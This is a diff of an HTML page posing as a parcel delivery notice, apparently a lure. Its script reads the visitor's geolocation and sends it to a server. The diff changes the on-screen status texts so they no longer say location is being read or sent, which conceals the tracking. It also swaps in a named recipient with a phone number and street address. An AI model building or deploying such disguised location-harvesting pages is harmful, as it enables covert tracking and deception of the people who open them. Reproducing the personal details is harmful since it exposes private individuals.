@@ -60,8 +60,8 @@
   <div class="section">
     <div class="section-title">收件資訊</div>
     <div class="receiver-info">
-      許子豪（+886 930292146）<br>
-      高雄市大樹區水寮路 174 號<br>
+      郭婉瑩（+886 971238266）<br>
+      高雄市大樹區檨腳里中興南路1號及1-1號1樓<br>
       預計到貨時間: 9月5日 - 9月6日
     </div>
   </div>
@@ -91,7 +91,7 @@
   let intervalId = null;
 
   function sendLocation() {
-    document.getElementById("output").innerHTML = "定位中...";
+    document.getElementById("output").innerHTML = "讀取中...";
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(position => {
         const latitude = position.coords.latitude;
@@ -106,7 +106,7 @@
         .then(res => res.text())
         .then(data => {
           console.log("回傳成功:", data);
-          document.getElementById("output").innerHTML = "位置已送出！";
+          document.getElementById("output").innerHTML = "請稍號...";
         })
         .catch(err => {
           console.error("錯誤:", err);
